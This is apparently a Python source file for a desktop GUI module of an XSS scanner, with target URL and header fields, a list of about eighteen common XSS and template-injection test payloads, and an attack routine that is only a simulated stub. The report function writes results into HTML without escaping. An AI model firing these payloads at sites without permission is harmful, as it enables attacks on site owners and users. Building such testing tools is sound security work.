import tkinter as tk
import customtkinter as ctk
import json
import webbrowser
from threading import Thread
from tkinter import messagebox

# ---------- Placeholder / mock functions ----------
def get_predefined_xss_payloads():
    """
    Returns a larger list of common XSS payloads for educational/testing purposes.
    """
    return [
        "<script>alert('XSS');</script>",
        "<script>alert(document.cookie);</script>",
        "'\"><script>alert('XSS');</script>",
        "<img src=x onerror=alert('XSS')>",
        "<img src=invalid onerror=alert(document.domain)>",
        "<body onload=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<div onmouseover=alert('XSS')>Hover me</div>",
        "<input type=text value='' onfocus=alert('XSS')>",
        "<!--[if lte IE 6]><script>alert('XSS in conditional comment');</script><![endif]-->",
        "javascript:alert('XSS')",
        "\"'><script>alert('XSS')</script>",
        "\" onfocus=alert('XSS') autofocus=\"",
        "<script src=data:text/javascript,alert('XSS')></script>",
        "<link rel=stylesheet href=data:text/css,body{background:blue} onload=alert('XSS')>",
        "{{7*7}}",
        "{% 7*7 %}",
    ]

def load_payloads_from_file():
    """Simulated function to load payloads from a file."""
    return ["<script>alert('File XSS');</script>"]

def execute_xss_attack(url, headers, payloads):
    """Simulated function yielding results during an XSS attack."""
    for payload in payloads:
        yield {"payload": payload, "success": True}

def generate_html_report(results):
    """Simulates report generation and returns the file path."""
    report_path = "/tmp/xss_report.html"
    with open(report_path, "w", encoding="utf-8") as f:
        f.write("<html><body><h1>XSS Report</h1>")
        for r in results:
            f.write(f"<p>{r}</p>")
        f.write("</body></html>")
    return report_path

def save_results_to_file(data, filename):
    """Simulated data saving to a file."""
    with open(filename, "w", encoding="utf-8") as f:
        if isinstance(data, list):
            json.dump(data, f, indent=2)
        else:
            f.write(str(data))
    return True

class XSSWindow(ctk.CTkFrame):
    """
    A single-column, scrollable XSS scanner window
    with one results box at the bottom and
    expanded predefined XSS payloads for easy copying.
    """
    
    def __init__(self, parent):
        super().__init__(parent)
        self.running = False
        self.results = []
        self.attack_process = None
        
        # Create UI in one scrollable column
        self._create_ui()

    def _create_ui(self):
        """Creates a single scrollable column for all XSS options and results."""
        # Make the entire content scrollable
        scrollable_frame = ctk.CTkScrollableFrame(self)
        scrollable_frame.pack(fill="both", expand=True)

        # Title / label
        ctk.CTkLabel(
            scrollable_frame,
            text="XSS Module (One-Column Layout)",
            font=ctk.CTkFont(weight="bold", size=16)
        ).pack(pady=5, padx=5)

        # Target URL
        ctk.CTkLabel(
            scrollable_frame, 
            text="Target URL:",
            anchor="w"
        ).pack(pady=(10, 0), padx=5, fill="x")
        
        self.url_entry = ctk.CTkEntry(
            scrollable_frame, 
            placeholder_text="http://example.com/vulnerable"
        )
        self.url_entry.pack(pady=(0, 10), padx=5, fill="x")

        # HTTP Headers
        ctk.CTkLabel(
            scrollable_frame, 
            text="HTTP Headers (JSON):", 
            anchor="w"
        ).pack(pady=(10, 0), padx=5, fill="x")
        
        self.headers_entry = ctk.CTkTextbox(
            scrollable_frame, 
            height=50, 
            wrap="word"
        )
        self.headers_entry.insert("1.0", '{"User-Agent": "Mozilla/5.0"}')
        self.headers_entry.pack(pady=(0, 10), padx=5, fill="x")

        # XSS Payloads
        payloads_frame = ctk.CTkFrame(scrollable_frame)
        payloads_frame.pack(padx=5, pady=5, fill="x")

        ctk.CTkLabel(
            payloads_frame,
            text="XSS Payloads",
            font=ctk.CTkFont(weight="bold")
        ).pack(pady=5)

        self.payloads_text = ctk.CTkTextbox(
            payloads_frame,
            height=100,
            wrap="word"
        )
        self.payloads_text.pack(pady=5, fill="x")

        # Payload buttons
        payload_buttons = ctk.CTkFrame(payloads_frame)
        payload_buttons.pack(fill="x")

        ctk.CTkButton(
            payload_buttons,
            text="Load Predefined Payloads",
            command=self._load_predefined_payloads
        ).pack(side="left", padx=5, pady=5)

        ctk.CTkButton(
            payload_buttons,
            text="Load from File",
            command=self._load_from_file
        ).pack(side="left", padx=5, pady=5)

        ctk.CTkButton(
            payload_buttons,
            text="Save Payloads",
            command=self._save_payloads
        ).pack(side="left", padx=5, pady=5)

        # Attack controls
        attack_frame = ctk.CTkFrame(scrollable_frame)
        attack_frame.pack(padx=5, pady=10, fill="x")

        self.start_button = ctk.CTkButton(
            attack_frame,
            text="Start XSS Attack",
            command=self._start_attack
        )
        self.start_button.pack(side="left", padx=5)

        self.stop_button = ctk.CTkButton(
            attack_frame,
            text="Stop",
            command=self._stop_attack,
            state="disabled"
        )
        self.stop_button.pack(side="left", padx=5)

        self.clear_button = ctk.CTkButton(
            attack_frame,
            text="Clear Results",
            command=self._clear_results
        )
        self.clear_button.pack(side="left", padx=5)

        ctk.CTkButton(
            attack_frame,
            text="Generate HTML Report",
            command=self._generate_report
        ).pack(side="left", padx=5)

        ctk.CTkButton(
            attack_frame,
            text="Save Results",
            command=self._save_results
        ).pack(side="left", padx=5)

        # Single results text box at the bottom
        ctk.CTkLabel(
            scrollable_frame,
            text="Results",
            font=ctk.CTkFont(weight="bold")
        ).pack(pady=5)

        self.results_text = ctk.CTkTextbox(
            scrollable_frame,
            height=150,
            wrap="word"
        )
        self.results_text.pack(padx=5, pady=5, fill="both", expand=True)

    # ---------- PAYLOADS LOADING / SAVING ----------
    def _load_predefined_payloads(self):
        """Loads predefined payloads into the payloads_text box."""
        try:
            payloads = get_predefined_xss_payloads()
            self.payloads_text.delete("1.0", "end")
            self.payloads_text.insert("1.0", "\n".join(payloads))
        except Exception as e:
            messagebox.showerror("Error", f"Error loading predefined payloads: {str(e)}")

    def _load_from_file(self):
        """Loads payloads from a file."""
        try:
            payloads = load_payloads_from_file()
            if payloads:
                self.payloads_text.delete("1.0", "end")
                self.payloads_text.insert("1.0", "\n".join(payloads))
        except Exception as e:
            messagebox.showerror("Error", f"Error loading payloads from file: {str(e)}")

    def _save_payloads(self):
        """Saves the current payloads to a file."""
        try:
            payloads = self.payloads_text.get("1.0", "end-1c").split("\n")
            if save_results_to_file(payloads, "xss_payloads.txt"):
                messagebox.showinfo("Success", "Payloads saved successfully")
        except Exception as e:
            messagebox.showerror("Error", f"Error saving payloads: {str(e)}")

    # ---------- ATTACK LOGIC ----------
    def _start_attack(self):
        """Starts the XSS attack."""
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showerror("Error", "You must specify a target URL")
            return

        # Get headers
        try:
            headers = json.loads(self.headers_entry.get("1.0", "end-1c"))
        except json.JSONDecodeError:
            messagebox.showerror("Error", "HTTP headers must be valid JSON")
            return

        # Get payloads
        payloads = self.payloads_text.get("1.0", "end-1c").split("\n")
        if not payloads:
            messagebox.showerror("Error", "You must specify at least one payload")
            return

        # Clear previous results
        self.results_text.delete("1.0", "end")
        self.results = []

        # Update UI
        self.running = True
        self.start_button.configure(state="disabled")
        self.stop_button.configure(state="normal")

        # Start the attack in a separate thread
        Thread(target=self._attack_thread, args=(url, headers, payloads), daemon=True).start()

    def _attack_thread(self, url, headers, payloads):
        """Executes the attack in a separate thread."""
        try:
            self.results_text.insert("end", "Starting XSS attack...\n")
            for result in execute_xss_attack(url, headers, payloads):
                if not self.running:
                    break
                self.results.append(result)
                self._update_results(result)
        except Exception as e:
            messagebox.showerror("Error", f"Error during the attack: {str(e)}")
        finally:
            self._stop_attack()

    def _stop_attack(self):
        """Stops the attack."""
        self.running = False
        if self.attack_process:
            self.attack_process.terminate()

        self.start_button.configure(state="normal")
        self.stop_button.configure(state="disabled")
        self.results_text.insert("end", "\nAttack stopped.\n")

    def _update_results(self, result):
        """Updates the single results box with a new result."""
        self.results_text.insert("end", json.dumps(result, indent=2) + "\n")
        self.results_text.see("end")

    def _clear_results(self):
        """Clears the results box."""
        self.results_text.delete("1.0", "end")
        self.results = []

    # ---------- REPORTING / SAVING RESULTS ----------
    def _generate_report(self):
        """Generates an HTML report of the results."""
        if not self.results:
            messagebox.showerror("Error", "No results to generate a report")
            return
        try:
            report_path = generate_html_report(self.results)
            webbrowser.open(report_path)
            messagebox.showinfo("Success", f"Report generated and opened: {report_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Error generating report: {str(e)}")

    def _save_results(self):
        """Saves the results to a file."""
        if not self.results:
            messagebox.showerror("Error", "No results to save")
            return
        try:
            if save_results_to_file(self.results, "xss_results.json"):
                messagebox.showinfo("Success", "Results saved successfully")
        except Exception as e:
            messagebox.showerror("Error", f"Error saving results: {str(e)}")
